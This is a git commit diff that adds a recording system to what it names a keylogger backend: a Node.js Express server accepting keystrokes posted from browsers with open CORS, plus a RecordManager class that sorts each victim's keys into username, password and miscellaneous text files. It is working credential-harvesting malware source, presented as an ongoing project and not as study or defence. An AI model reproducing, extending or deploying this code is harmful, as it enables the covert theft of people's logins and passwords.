1911317664156575549e17898ba9c2089b027930
Luke Bousfield <luke.j.bousfield@gmail.com>
2019-09-02 13:44:50 -0600

    Added system for recording

--- keylogger-backend.js
+++ keylogger-backend.js
@@ -2,14 +2,30 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
+const RecordManager = require('./record-man');
+const path = require('path');
 
 const app = express();
+let rm = new RecordManager(path.join(__dirname, 'records'));
 
 app.use(bodyParser.urlencoded());
 app.use(cors());
 
+function isTypingKey(key) {
+    let code = key.code;
+    return (code >= 48 && code <= 90) || (code >= 96 && code <= 111) || (code >= 186 && code <= 222) || code == 8;
+}
+
 app.post('/', (req, res) => {
-    console.log(req.body);
+    var keyInfo = req.body;
+    var seed = keyInfo.seed;
+    if (isTypingKey(keyInfo)) {
+        console.log('typing key');
+        rm.addRecord(keyInfo);
+    }
+    res.json({
+        success: true
+    });
 });
 
 app.listen(8080);
---
+++ record-man.js
@@ -0,0 +1,115 @@
+
+const fs = require('fs');
+const pathMod = require('path');
+
+function createMultipleFiles(parent, files) {
+    let promises = [];
+    for (let i = 0; i < files.length; i++) {
+        let filePath = pathMod.join(parent, files[i]);
+        promises.push(new Promise((resolve, reject) => {
+            fs.writeFile(filePath, '', 'utf8', err => {
+                if (err) {
+                    reject(err);
+                } else {
+                    resolve();
+                } 
+            });
+        }));
+    }
+    return Promise.all(promises);
+}
+
+class RecordManager {
+    constructor(recordsPath) {
+        this.path = recordsPath;
+        console.log('creating record manager');
+    }
+    doesSeedExist(seed) {
+        console.log(`checking if seed ${seed} exists`);
+        return new Promise((resolve, reject) => {
+            fs.access(pathMod.join(this.path, seed), fs.constants.F_OK | fs.constants.W_OK, err => {
+                if (err) {
+                    if (err.code === 'ENOENT') {
+                        console.log('seed does not exist');
+                        resolve(false);
+                    } else {
+                        reject(err);
+                    }
+                } else {
+                    console.log('seed exists');
+                    resolve(true);
+                }
+            });
+        });
+    }
+    createSeed(seed) {
+        console.log(`creeating seed ${seed}`);
+        let seedPath = pathMod.join(this.path, seed);
+        return new Promise((resolve, reject) => {
+            fs.mkdir(seedPath, {
+                recursive: true
+            }, err => {
+                if (err) {
+                    return reject(err);
+                }
+                console.log('made directory for seed');
+                resolve(['username.txt', 'password.txt', 'misc.txt']);
+            });
+        })
+        .then(files => createMultipleFiles(seedPath, files));
+    }
+    addRecordToFile(record, targetPath) {
+        console.log('add record to file');
+        return new Promise((resolve, reject) => {
+            if (record.code == 8) {
+                console.log('backspace');
+                fs.readFile(targetPath, 'utf8', (err, data) => {
+                    if (err) {
+                        reject(err);
+                    } else {
+                        let withBackspace = data.substring(0, data.length - 1);
+                        console.log(`before backspace: ${data}, after: ${withBackspace}`);
+                        fs.writeFile(targetPath, withBackspace, 'utf8', err => {
+                            console.log('wrote');
+                            if (err) {
+                                reject(err);
+                            } else {
+                                resolve();
+                            }
+                        });
+                    }
+                });
+            } else {
+                console.log('regular key');
+                fs.appendFile(targetPath, record.key, 'utf8', err => {
+                    console.log('callback');
+                    if (err) {
+                        reject(err);
+                    } else {
+                        resolve();
+                    }
+                });
+            }
+        });
+    }
+    addRecord(record) {
+        let seed = record.seed;
+        let targetFile = (record.target === 'username' || record.target === 'password' ? record.target : 'misc') + '.txt';
+        let targetPath = pathMod.join(this.path, seed, targetFile);
+        return this.doesSeedExist(seed)
+            .then(exists => {
+                if (exists) {
+                    console.log('adding record to file');
+                    return this.addRecordToFile(record, targetPath);
+                } else {
+                    return this.createSeed(seed)
+                        .then(() => {
+                            console.log('done creating record');
+                            return this.addRecordToFile(record, targetPath);
+                        });
+                }
+            });
+    }
+}
+
+module.exports = RecordManager;
